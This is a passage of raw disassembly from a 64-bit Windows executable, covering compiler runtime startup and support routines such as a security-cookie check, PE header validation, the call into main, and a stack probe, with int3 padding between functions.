   140002c89:	ff 15 31 27 00 00    	call   *0x2731(%rip)        # 0x1400053c0
   140002c8f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140002c93:	48 85 c9             	test   %rcx,%rcx
   140002c96:	74 07                	je     0x140002c9f
   140002c98:	ff 15 1a 24 00 00    	call   *0x241a(%rip)        # 0x1400050b8
   140002c9e:	90                   	nop
   140002c9f:	40 f6 c7 01          	test   $0x1,%dil
   140002ca3:	74 0d                	je     0x140002cb2
   140002ca5:	ba 20 00 00 00       	mov    $0x20,%edx
   140002caa:	48 8b cb             	mov    %rbx,%rcx
   140002cad:	e8 6e 00 00 00       	call   0x140002d20
   140002cb2:	48 8b c3             	mov    %rbx,%rax
   140002cb5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002cba:	48 83 c4 20          	add    $0x20,%rsp
   140002cbe:	5f                   	pop    %rdi
   140002cbf:	c3                   	ret
   140002cc0:	48 83 ec 48          	sub    $0x48,%rsp
   140002cc4:	4c 8b c2             	mov    %rdx,%r8
   140002cc7:	45 33 c9             	xor    %r9d,%r9d
   140002cca:	8b d1                	mov    %ecx,%edx
   140002ccc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002cd1:	e8 ea fe ff ff       	call   0x140002bc0
   140002cd6:	48 8d 15 2b 39 00 00 	lea    0x392b(%rip),%rdx        # 0x140006608
   140002cdd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002ce2:	e8 75 0f 00 00       	call   0x140003c5c
   140002ce7:	cc                   	int3
   140002ce8:	cc                   	int3
   140002ce9:	cc                   	int3
   140002cea:	cc                   	int3
   140002ceb:	cc                   	int3
   140002cec:	cc                   	int3
   140002ced:	cc                   	int3
   140002cee:	cc                   	int3
   140002cef:	cc                   	int3
   140002cf0:	cc                   	int3
   140002cf1:	cc                   	int3
   140002cf2:	cc                   	int3
   140002cf3:	cc                   	int3
   140002cf4:	cc                   	int3
   140002cf5:	cc                   	int3
   140002cf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002cfd:	00 00 00 
   140002d00:	48 3b 0d 39 53 00 00 	cmp    0x5339(%rip),%rcx        # 0x140008040
   140002d07:	75 10                	jne    0x140002d19
   140002d09:	48 c1 c1 10          	rol    $0x10,%rcx
   140002d0d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140002d12:	75 01                	jne    0x140002d15
   140002d14:	c3                   	ret
   140002d15:	48 c1 c9 10          	ror    $0x10,%rcx
   140002d19:	e9 86 06 00 00       	jmp    0x1400033a4
   140002d1e:	cc                   	int3
   140002d1f:	cc                   	int3
   140002d20:	e9 c7 07 00 00       	jmp    0x1400034ec
   140002d25:	cc                   	int3
   140002d26:	cc                   	int3
   140002d27:	cc                   	int3
   140002d28:	40 53                	rex push %rbx
   140002d2a:	48 83 ec 20          	sub    $0x20,%rsp
   140002d2e:	48 8b d9             	mov    %rcx,%rbx
   140002d31:	eb 0f                	jmp    0x140002d42
   140002d33:	48 8b cb             	mov    %rbx,%rcx
   140002d36:	e8 4b 0f 00 00       	call   0x140003c86
   140002d3b:	85 c0                	test   %eax,%eax
   140002d3d:	74 13                	je     0x140002d52
   140002d3f:	48 8b cb             	mov    %rbx,%rcx
   140002d42:	e8 39 0f 00 00       	call   0x140003c80
   140002d47:	48 85 c0             	test   %rax,%rax
   140002d4a:	74 e7                	je     0x140002d33
   140002d4c:	48 83 c4 20          	add    $0x20,%rsp
   140002d50:	5b                   	pop    %rbx
   140002d51:	c3                   	ret
   140002d52:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140002d56:	74 06                	je     0x140002d5e
   140002d58:	e8 bb 07 00 00       	call   0x140003518
   140002d5d:	cc                   	int3
   140002d5e:	e8 9d e4 ff ff       	call   0x140001200
   140002d63:	cc                   	int3
   140002d64:	48 8b c4             	mov    %rsp,%rax
   140002d67:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140002d6b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002d6f:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140002d73:	53                   	push   %rbx
   140002d74:	56                   	push   %rsi
   140002d75:	57                   	push   %rdi
   140002d76:	41 56                	push   %r14
   140002d78:	48 83 ec 38          	sub    $0x38,%rsp
   140002d7c:	4d 8b f1             	mov    %r9,%r14
   140002d7f:	49 8b d8             	mov    %r8,%rbx
   140002d82:	48 8b f2             	mov    %rdx,%rsi
   140002d85:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   140002d89:	48 8b fa             	mov    %rdx,%rdi
   140002d8c:	49 0f af f8          	imul   %r8,%rdi
   140002d90:	48 03 f9             	add    %rcx,%rdi
   140002d93:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140002d97:	48 8b c3             	mov    %rbx,%rax
   140002d9a:	48 ff cb             	dec    %rbx
   140002d9d:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140002da2:	48 85 c0             	test   %rax,%rax
   140002da5:	74 19                	je     0x140002dc0
   140002da7:	48 2b fe             	sub    %rsi,%rdi
   140002daa:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140002daf:	48 8b cf             	mov    %rdi,%rcx
   140002db2:	49 8b c6             	mov    %r14,%rax
   140002db5:	48 8b 15 04 26 00 00 	mov    0x2604(%rip),%rdx        # 0x1400053c0
   140002dbc:	ff d2                	call   *%rdx
   140002dbe:	eb d7                	jmp    0x140002d97
   140002dc0:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   140002dc5:	48 83 c4 38          	add    $0x38,%rsp
   140002dc9:	41 5e                	pop    %r14
   140002dcb:	5f                   	pop    %rdi
   140002dcc:	5e                   	pop    %rsi
   140002dcd:	5b                   	pop    %rbx
   140002dce:	c3                   	ret
   140002dcf:	cc                   	int3
   140002dd0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002dd5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002dda:	57                   	push   %rdi
   140002ddb:	41 56                	push   %r14
   140002ddd:	41 57                	push   %r15
   140002ddf:	48 83 ec 40          	sub    $0x40,%rsp
   140002de3:	4d 8b f1             	mov    %r9,%r14
   140002de6:	49 8b f0             	mov    %r8,%rsi
   140002de9:	4c 8b fa             	mov    %rdx,%r15
   140002dec:	48 8b f9             	mov    %rcx,%rdi
   140002def:	33 db                	xor    %ebx,%ebx
   140002df1:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002df6:	48 3b de             	cmp    %rsi,%rbx
   140002df9:	74 19                	je     0x140002e14
   140002dfb:	49 2b ff             	sub    %r15,%rdi
   140002dfe:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140002e03:	48 8b cf             	mov    %rdi,%rcx
   140002e06:	49 8b c6             	mov    %r14,%rax
   140002e09:	ff 15 b1 25 00 00    	call   *0x25b1(%rip)        # 0x1400053c0
   140002e0f:	48 ff c3             	inc    %rbx
   140002e12:	eb dd                	jmp    0x140002df1
   140002e14:	eb 00                	jmp    0x140002e16
   140002e16:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140002e1b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140002e20:	48 83 c4 40          	add    $0x40,%rsp
   140002e24:	41 5f                	pop    %r15
   140002e26:	41 5e                	pop    %r14
   140002e28:	5f                   	pop    %rdi
   140002e29:	c3                   	ret
   140002e2a:	cc                   	int3
   140002e2b:	cc                   	int3
   140002e2c:	40 53                	rex push %rbx
   140002e2e:	48 83 ec 20          	sub    $0x20,%rsp
   140002e32:	48 8d 05 57 26 00 00 	lea    0x2657(%rip),%rax        # 0x140005490
   140002e39:	48 8b d9             	mov    %rcx,%rbx
   140002e3c:	48 89 01             	mov    %rax,(%rcx)
   140002e3f:	f6 c2 01             	test   $0x1,%dl
   140002e42:	74 0a                	je     0x140002e4e
   140002e44:	ba 18 00 00 00       	mov    $0x18,%edx
   140002e49:	e8 d2 fe ff ff       	call   0x140002d20
   140002e4e:	48 8b c3             	mov    %rbx,%rax
   140002e51:	48 83 c4 20          	add    $0x20,%rsp
   140002e55:	5b                   	pop    %rbx
   140002e56:	c3                   	ret
   140002e57:	cc                   	int3
   140002e58:	40 53                	rex push %rbx
   140002e5a:	48 83 ec 20          	sub    $0x20,%rsp
   140002e5e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002e63:	e8 30 0e 00 00       	call   0x140003c98
   140002e68:	e8 87 07 00 00       	call   0x1400035f4
   140002e6d:	8b c8                	mov    %eax,%ecx
   140002e6f:	e8 5a 0e 00 00       	call   0x140003cce
   140002e74:	e8 6f 07 00 00       	call   0x1400035e8
   140002e79:	8b d8                	mov    %eax,%ebx
   140002e7b:	e8 72 0e 00 00       	call   0x140003cf2
   140002e80:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002e85:	89 18                	mov    %ebx,(%rax)
   140002e87:	e8 b0 02 00 00       	call   0x14000313c
   140002e8c:	84 c0                	test   %al,%al
   140002e8e:	74 73                	je     0x140002f03
   140002e90:	e8 1f 0a 00 00       	call   0x1400038b4
   140002e95:	48 8d 0d 54 0a 00 00 	lea    0xa54(%rip),%rcx        # 0x1400038f0
   140002e9c:	e8 4b 04 00 00       	call   0x1400032ec
   140002ea1:	e8 46 07 00 00       	call   0x1400035ec
   140002ea6:	8b c8                	mov    %eax,%ecx
   140002ea8:	e8 f7 0d 00 00       	call   0x140003ca4
   140002ead:	85 c0                	test   %eax,%eax
   140002eaf:	75 52                	jne    0x140002f03
   140002eb1:	e8 46 07 00 00       	call   0x1400035fc
   140002eb6:	e8 79 07 00 00       	call   0x140003634
   140002ebb:	85 c0                	test   %eax,%eax
   140002ebd:	74 0c                	je     0x140002ecb
   140002ebf:	48 8d 0d 22 07 00 00 	lea    0x722(%rip),%rcx        # 0x1400035e8
   140002ec6:	e8 d3 0d 00 00       	call   0x140003c9e
   140002ecb:	e8 34 04 00 00       	call   0x140003304
   140002ed0:	e8 2f 04 00 00       	call   0x140003304
   140002ed5:	e8 0e 07 00 00       	call   0x1400035e8
   140002eda:	8b c8                	mov    %eax,%ecx
   140002edc:	e8 05 0e 00 00       	call   0x140003ce6
   140002ee1:	e8 26 07 00 00       	call   0x14000360c
   140002ee6:	84 c0                	test   %al,%al
   140002ee8:	74 05                	je     0x140002eef
   140002eea:	e8 bb 0d 00 00       	call   0x140003caa
   140002eef:	e8 f4 06 00 00       	call   0x1400035e8
   140002ef4:	e8 eb 08 00 00       	call   0x1400037e4
   140002ef9:	85 c0                	test   %eax,%eax
   140002efb:	75 06                	jne    0x140002f03
   140002efd:	48 83 c4 20          	add    $0x20,%rsp
   140002f01:	5b                   	pop    %rbx
   140002f02:	c3                   	ret
   140002f03:	b9 07 00 00 00       	mov    $0x7,%ecx
   140002f08:	e8 4f 07 00 00       	call   0x14000365c
   140002f0d:	cc                   	int3
   140002f0e:	cc                   	int3
   140002f0f:	cc                   	int3
   140002f10:	48 83 ec 28          	sub    $0x28,%rsp
   140002f14:	e8 ff 06 00 00       	call   0x140003618
   140002f19:	33 c0                	xor    %eax,%eax
   140002f1b:	48 83 c4 28          	add    $0x28,%rsp
   140002f1f:	c3                   	ret
   140002f20:	48 83 ec 28          	sub    $0x28,%rsp
   140002f24:	e8 17 09 00 00       	call   0x140003840
   140002f29:	e8 ba 06 00 00       	call   0x1400035e8
   140002f2e:	8b c8                	mov    %eax,%ecx
   140002f30:	48 83 c4 28          	add    $0x28,%rsp
   140002f34:	e9 b3 0d 00 00       	jmp    0x140003cec
   140002f39:	cc                   	int3
   140002f3a:	cc                   	int3
   140002f3b:	cc                   	int3
   140002f3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f41:	57                   	push   %rdi
   140002f42:	48 83 ec 30          	sub    $0x30,%rsp
   140002f46:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002f4b:	e8 b0 01 00 00       	call   0x140003100
   140002f50:	84 c0                	test   %al,%al
   140002f52:	0f 84 30 01 00 00    	je     0x140003088
   140002f58:	40 32 ff             	xor    %dil,%dil
   140002f5b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140002f60:	e8 5f 01 00 00       	call   0x1400030c4
   140002f65:	8a d8                	mov    %al,%bl
   140002f67:	8b 0d 23 52 00 00    	mov    0x5223(%rip),%ecx        # 0x140008190
   140002f6d:	83 f9 01             	cmp    $0x1,%ecx
   140002f70:	0f 84 1d 01 00 00    	je     0x140003093
   140002f76:	85 c9                	test   %ecx,%ecx
   140002f78:	75 4a                	jne    0x140002fc4
   140002f7a:	c7 05 0c 52 00 00 01 	movl   $0x1,0x520c(%rip)        # 0x140008190
   140002f81:	00 00 00 
   140002f84:	48 8d 15 95 24 00 00 	lea    0x2495(%rip),%rdx        # 0x140005420
   140002f8b:	48 8d 0d 76 24 00 00 	lea    0x2476(%rip),%rcx        # 0x140005408
   140002f92:	e8 25 0d 00 00       	call   0x140003cbc
   140002f97:	85 c0                	test   %eax,%eax
   140002f99:	74 0a                	je     0x140002fa5
   140002f9b:	b8 ff 00 00 00       	mov    $0xff,%eax
   140002fa0:	e9 d8 00 00 00       	jmp    0x14000307d
   140002fa5:	48 8d 15 54 24 00 00 	lea    0x2454(%rip),%rdx        # 0x140005400
   140002fac:	48 8d 0d 35 24 00 00 	lea    0x2435(%rip),%rcx        # 0x1400053e8
   140002fb3:	e8 fe 0c 00 00       	call   0x140003cb6
   140002fb8:	c7 05 ce 51 00 00 02 	movl   $0x2,0x51ce(%rip)        # 0x140008190
   140002fbf:	00 00 00 
   140002fc2:	eb 08                	jmp    0x140002fcc
   140002fc4:	40 b7 01             	mov    $0x1,%dil
   140002fc7:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140002fcc:	8a cb                	mov    %bl,%cl
   140002fce:	e8 8d 02 00 00       	call   0x140003260
   140002fd3:	e8 68 06 00 00       	call   0x140003640
   140002fd8:	48 8b d8             	mov    %rax,%rbx
   140002fdb:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002fdf:	74 1e                	je     0x140002fff
   140002fe1:	48 8b c8             	mov    %rax,%rcx
   140002fe4:	e8 df 01 00 00       	call   0x1400031c8
   140002fe9:	84 c0                	test   %al,%al
   140002feb:	74 12                	je     0x140002fff
   140002fed:	45 33 c0             	xor    %r8d,%r8d
   140002ff0:	41 8d 50 02          	lea    0x2(%r8),%edx
   140002ff4:	33 c9                	xor    %ecx,%ecx
   140002ff6:	48 8b 03             	mov    (%rbx),%rax
   140002ff9:	ff 15 c1 23 00 00    	call   *0x23c1(%rip)        # 0x1400053c0
   140002fff:	e8 44 06 00 00       	call   0x140003648
   140003004:	48 8b d8             	mov    %rax,%rbx
   140003007:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000300b:	74 14                	je     0x140003021
   14000300d:	48 8b c8             	mov    %rax,%rcx
   140003010:	e8 b3 01 00 00       	call   0x1400031c8
   140003015:	84 c0                	test   %al,%al
   140003017:	74 08                	je     0x140003021
   140003019:	48 8b 0b             	mov    (%rbx),%rcx
   14000301c:	e8 bf 0c 00 00       	call   0x140003ce0
   140003021:	e8 82 07 00 00       	call   0x1400037a8
   140003026:	0f b7 d8             	movzwl %ax,%ebx
   140003029:	e8 82 0c 00 00       	call   0x140003cb0
   14000302e:	44 8b cb             	mov    %ebx,%r9d
   140003031:	4c 8b c0             	mov    %rax,%r8
   140003034:	33 d2                	xor    %edx,%edx
   140003036:	48 8d 0d c3 cf ff ff 	lea    -0x303d(%rip),%rcx        # 0x140000000
   14000303d:	e8 1e f1 ff ff       	call   0x140002160
   140003042:	8b d8                	mov    %eax,%ebx
   140003044:	e8 a3 07 00 00       	call   0x1400037ec
   140003049:	84 c0                	test   %al,%al
   14000304b:	74 50                	je     0x14000309d
   14000304d:	40 84 ff             	test   %dil,%dil
   140003050:	75 05                	jne    0x140003057
   140003052:	e8 7d 0c 00 00       	call   0x140003cd4
   140003057:	33 d2                	xor    %edx,%edx
   140003059:	b1 01                	mov    $0x1,%cl
   14000305b:	e8 24 02 00 00       	call   0x140003284
   140003060:	8b c3                	mov    %ebx,%eax
   140003062:	eb 19                	jmp    0x14000307d
   140003064:	8b d8                	mov    %eax,%ebx
   140003066:	e8 81 07 00 00       	call   0x1400037ec
   14000306b:	84 c0                	test   %al,%al
   14000306d:	74 36                	je     0x1400030a5
   14000306f:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140003074:	75 05                	jne    0x14000307b
   140003076:	e8 5f 0c 00 00       	call   0x140003cda
   14000307b:	8b c3                	mov    %ebx,%eax
   14000307d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003082:	48 83 c4 30          	add    $0x30,%rsp
   140003086:	5f                   	pop    %rdi
   140003087:	c3                   	ret
   140003088:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000308d:	e8 ca 05 00 00       	call   0x14000365c
   140003092:	90                   	nop
   140003093:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003098:	e8 bf 05 00 00       	call   0x14000365c
   14000309d:	8b cb                	mov    %ebx,%ecx
   14000309f:	e8 1e 0c 00 00       	call   0x140003cc2
   1400030a4:	90                   	nop
   1400030a5:	8b cb                	mov    %ebx,%ecx
   1400030a7:	e8 1c 0c 00 00       	call   0x140003cc8
   1400030ac:	90                   	nop
   1400030ad:	cc                   	int3
   1400030ae:	cc                   	int3
   1400030af:	cc                   	int3
   1400030b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400030b4:	e8 7f 04 00 00       	call   0x140003538
   1400030b9:	48 83 c4 28          	add    $0x28,%rsp
   1400030bd:	e9 7a fe ff ff       	jmp    0x140002f3c
   1400030c2:	cc                   	int3
   1400030c3:	cc                   	int3
   1400030c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400030c8:	e8 f7 0a 00 00       	call   0x140003bc4
   1400030cd:	85 c0                	test   %eax,%eax
   1400030cf:	74 21                	je     0x1400030f2
   1400030d1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400030d8:	00 00 
   1400030da:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400030de:	eb 05                	jmp    0x1400030e5
   1400030e0:	48 3b c8             	cmp    %rax,%rcx
   1400030e3:	74 14                	je     0x1400030f9
   1400030e5:	33 c0                	xor    %eax,%eax
   1400030e7:	f0 48 0f b1 0d a8 50 	lock cmpxchg %rcx,0x50a8(%rip)        # 0x140008198
   1400030ee:	00 00 
   1400030f0:	75 ee                	jne    0x1400030e0
   1400030f2:	32 c0                	xor    %al,%al
   1400030f4:	48 83 c4 28          	add    $0x28,%rsp
   1400030f8:	c3                   	ret
   1400030f9:	b0 01                	mov    $0x1,%al
   1400030fb:	eb f7                	jmp    0x1400030f4
   1400030fd:	cc                   	int3
   1400030fe:	cc                   	int3
   1400030ff:	cc                   	int3
   140003100:	48 83 ec 28          	sub    $0x28,%rsp
   140003104:	85 c9                	test   %ecx,%ecx
   140003106:	75 07                	jne    0x14000310f
   140003108:	c6 05 91 50 00 00 01 	movb   $0x1,0x5091(%rip)        # 0x1400081a0
   14000310f:	e8 18 08 00 00       	call   0x14000392c
   140003114:	e8 f3 04 00 00       	call   0x14000360c
   140003119:	84 c0                	test   %al,%al
   14000311b:	75 04                	jne    0x140003121
   14000311d:	32 c0                	xor    %al,%al
   14000311f:	eb 14                	jmp    0x140003135
   140003121:	e8 e6 04 00 00       	call   0x14000360c
   140003126:	84 c0                	test   %al,%al
   140003128:	75 09                	jne    0x140003133
   14000312a:	33 c9                	xor    %ecx,%ecx
   14000312c:	e8 db 04 00 00       	call   0x14000360c
   140003131:	eb ea                	jmp    0x14000311d
   140003133:	b0 01                	mov    $0x1,%al
   140003135:	48 83 c4 28          	add    $0x28,%rsp
   140003139:	c3                   	ret
   14000313a:	cc                   	int3
   14000313b:	cc                   	int3
   14000313c:	40 53                	rex push %rbx
   14000313e:	48 83 ec 20          	sub    $0x20,%rsp
   140003142:	80 3d 58 50 00 00 00 	cmpb   $0x0,0x5058(%rip)        # 0x1400081a1
   140003149:	8b d9                	mov    %ecx,%ebx
   14000314b:	75 67                	jne    0x1400031b4
   14000314d:	83 f9 01             	cmp    $0x1,%ecx
   140003150:	77 6a                	ja     0x1400031bc
   140003152:	e8 6d 0a 00 00       	call   0x140003bc4
   140003157:	85 c0                	test   %eax,%eax
   140003159:	74 28                	je     0x140003183
   14000315b:	85 db                	test   %ebx,%ebx
   14000315d:	75 24                	jne    0x140003183
   14000315f:	48 8d 0d 42 50 00 00 	lea    0x5042(%rip),%rcx        # 0x1400081a8
   140003166:	e8 8d 0b 00 00       	call   0x140003cf8
   14000316b:	85 c0                	test   %eax,%eax
   14000316d:	75 10                	jne    0x14000317f
   14000316f:	48 8d 0d 4a 50 00 00 	lea    0x504a(%rip),%rcx        # 0x1400081c0
   140003176:	e8 7d 0b 00 00       	call   0x140003cf8
   14000317b:	85 c0                	test   %eax,%eax
   14000317d:	74 2e                	je     0x1400031ad
   14000317f:	32 c0                	xor    %al,%al
   140003181:	eb 33                	jmp    0x1400031b6
   140003183:	66 0f 6f 05 15 23 00 	movdqa 0x2315(%rip),%xmm0        # 0x1400054a0
   14000318a:	00 
   14000318b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000318f:	f3 0f 7f 05 11 50 00 	movdqu %xmm0,0x5011(%rip)        # 0x1400081a8
   140003196:	00 
   140003197:	48 89 05 1a 50 00 00 	mov    %rax,0x501a(%rip)        # 0x1400081b8
   14000319e:	f3 0f 7f 05 1a 50 00 	movdqu %xmm0,0x501a(%rip)        # 0x1400081c0
   1400031a5:	00 
   1400031a6:	48 89 05 23 50 00 00 	mov    %rax,0x5023(%rip)        # 0x1400081d0
   1400031ad:	c6 05 ed 4f 00 00 01 	movb   $0x1,0x4fed(%rip)        # 0x1400081a1
   1400031b4:	b0 01                	mov    $0x1,%al
   1400031b6:	48 83 c4 20          	add    $0x20,%rsp
   1400031ba:	5b                   	pop    %rbx
   1400031bb:	c3                   	ret
   1400031bc:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400031c1:	e8 96 04 00 00       	call   0x14000365c
   1400031c6:	cc                   	int3
   1400031c7:	cc                   	int3
   1400031c8:	48 83 ec 18          	sub    $0x18,%rsp
   1400031cc:	4c 8b c1             	mov    %rcx,%r8
   1400031cf:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400031d4:	66 39 05 25 ce ff ff 	cmp    %ax,-0x31db(%rip)        # 0x140000000
   1400031db:	75 78                	jne    0x140003255
   1400031dd:	48 63 0d 58 ce ff ff 	movslq -0x31a8(%rip),%rcx        # 0x14000003c
   1400031e4:	48 8d 15 15 ce ff ff 	lea    -0x31eb(%rip),%rdx        # 0x140000000
   1400031eb:	48 03 ca             	add    %rdx,%rcx
   1400031ee:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400031f4:	75 5f                	jne    0x140003255
   1400031f6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400031fb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400031ff:	75 54                	jne    0x140003255
   140003201:	4c 2b c2             	sub    %rdx,%r8
   140003204:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140003208:	48 83 c2 18          	add    $0x18,%rdx
   14000320c:	48 03 d1             	add    %rcx,%rdx
   14000320f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140003213:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003217:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   14000321b:	48 89 14 24          	mov    %rdx,(%rsp)
   14000321f:	49 3b d1             	cmp    %r9,%rdx
   140003222:	74 18                	je     0x14000323c
   140003224:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140003227:	4c 3b c1             	cmp    %rcx,%r8
   14000322a:	72 0a                	jb     0x140003236
   14000322c:	8b 42 08             	mov    0x8(%rdx),%eax
   14000322f:	03 c1                	add    %ecx,%eax
   140003231:	4c 3b c0             	cmp    %rax,%r8
   140003234:	72 08                	jb     0x14000323e
   140003236:	48 83 c2 28          	add    $0x28,%rdx
   14000323a:	eb df                	jmp    0x14000321b
   14000323c:	33 d2                	xor    %edx,%edx
   14000323e:	48 85 d2             	test   %rdx,%rdx
   140003241:	75 04                	jne    0x140003247
   140003243:	32 c0                	xor    %al,%al
   140003245:	eb 14                	jmp    0x14000325b
   140003247:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   14000324b:	7d 04                	jge    0x140003251
   14000324d:	32 c0                	xor    %al,%al
   14000324f:	eb 0a                	jmp    0x14000325b
   140003251:	b0 01                	mov    $0x1,%al
   140003253:	eb 06                	jmp    0x14000325b
   140003255:	32 c0                	xor    %al,%al
   140003257:	eb 02                	jmp    0x14000325b
   140003259:	32 c0                	xor    %al,%al
   14000325b:	48 83 c4 18          	add    $0x18,%rsp
   14000325f:	c3                   	ret
   140003260:	40 53                	rex push %rbx
   140003262:	48 83 ec 20          	sub    $0x20,%rsp
   140003266:	8a d9                	mov    %cl,%bl
   140003268:	e8 57 09 00 00       	call   0x140003bc4
   14000326d:	33 d2                	xor    %edx,%edx
   14000326f:	85 c0                	test   %eax,%eax
   140003271:	74 0b                	je     0x14000327e
   140003273:	84 db                	test   %bl,%bl
   140003275:	75 07                	jne    0x14000327e
   140003277:	48 87 15 1a 4f 00 00 	xchg   %rdx,0x4f1a(%rip)        # 0x140008198
   14000327e:	48 83 c4 20          	add    $0x20,%rsp
   140003282:	5b                   	pop    %rbx
   140003283:	c3                   	ret
   140003284:	40 53                	rex push %rbx
   140003286:	48 83 ec 20          	sub    $0x20,%rsp
   14000328a:	80 3d 0f 4f 00 00 00 	cmpb   $0x0,0x4f0f(%rip)        # 0x1400081a0
   140003291:	8a d9                	mov    %cl,%bl
   140003293:	74 04                	je     0x140003299
   140003295:	84 d2                	test   %dl,%dl
   140003297:	75 0c                	jne    0x1400032a5
   140003299:	e8 6e 03 00 00       	call   0x14000360c
   14000329e:	8a cb                	mov    %bl,%cl
   1400032a0:	e8 67 03 00 00       	call   0x14000360c
   1400032a5:	b0 01                	mov    $0x1,%al
   1400032a7:	48 83 c4 20          	add    $0x20,%rsp
   1400032ab:	5b                   	pop    %rbx
   1400032ac:	c3                   	ret
   1400032ad:	cc                   	int3
   1400032ae:	cc                   	int3
   1400032af:	cc                   	int3
   1400032b0:	40 53                	rex push %rbx
   1400032b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400032b6:	48 83 3d ea 4e 00 00 	cmpq   $0xffffffffffffffff,0x4eea(%rip)        # 0x1400081a8
   1400032bd:	ff 
   1400032be:	48 8b d9             	mov    %rcx,%rbx
   1400032c1:	75 07                	jne    0x1400032ca
   1400032c3:	e8 3c 0a 00 00       	call   0x140003d04
   1400032c8:	eb 0f                	jmp    0x1400032d9
   1400032ca:	48 8b d3             	mov    %rbx,%rdx
   1400032cd:	48 8d 0d d4 4e 00 00 	lea    0x4ed4(%rip),%rcx        # 0x1400081a8
   1400032d4:	e8 25 0a 00 00       	call   0x140003cfe
   1400032d9:	33 d2                	xor    %edx,%edx
   1400032db:	85 c0                	test   %eax,%eax
   1400032dd:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400032e1:	48 8b c2             	mov    %rdx,%rax
   1400032e4:	48 83 c4 20          	add    $0x20,%rsp
   1400032e8:	5b                   	pop    %rbx
   1400032e9:	c3                   	ret
   1400032ea:	cc                   	int3
   1400032eb:	cc                   	int3
   1400032ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400032f0:	e8 bb ff ff ff       	call   0x1400032b0
   1400032f5:	48 f7 d8             	neg    %rax
   1400032f8:	1b c0                	sbb    %eax,%eax
   1400032fa:	f7 d8                	neg    %eax
   1400032fc:	ff c8                	dec    %eax
   1400032fe:	48 83 c4 28          	add    $0x28,%rsp
   140003302:	c3                   	ret
   140003303:	cc                   	int3
   140003304:	c2 00 00             	ret    $0x0
   140003307:	cc                   	int3
   140003308:	cc                   	int3
   140003309:	cc                   	int3
   14000330a:	cc                   	int3
   14000330b:	cc                   	int3
   14000330c:	cc                   	int3
   14000330d:	cc                   	int3
   14000330e:	cc                   	int3
   14000330f:	cc                   	int3
   140003310:	cc                   	int3
   140003311:	cc                   	int3
   140003312:	cc                   	int3
   140003313:	cc                   	int3
   140003314:	cc                   	int3
   140003315:	cc                   	int3
   140003316:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000331d:	00 00 00 
   140003320:	48 83 ec 10          	sub    $0x10,%rsp
   140003324:	4c 89 14 24          	mov    %r10,(%rsp)
   140003328:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000332d:	4d 33 db             	xor    %r11,%r11
   140003330:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140003335:	4c 2b d0             	sub    %rax,%r10
   140003338:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000333c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140003343:	00 00 
   140003345:	4d 3b d3             	cmp    %r11,%r10
   140003348:	73 16                	jae    0x140003360
   14000334a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140003350:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140003357:	41 c6 03 00          	movb   $0x0,(%r11)
   14000335b:	4d 3b d3             	cmp    %r11,%r10
   14000335e:	75 f0                	jne    0x140003350
   140003360:	4c 8b 14 24          	mov    (%rsp),%r10
   140003364:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140003369:	48 83 c4 10          	add    $0x10,%rsp
   14000336d:	c3                   	ret
   14000336e:	cc                   	int3
   14000336f:	cc                   	int3
   140003370:	40 53                	rex push %rbx
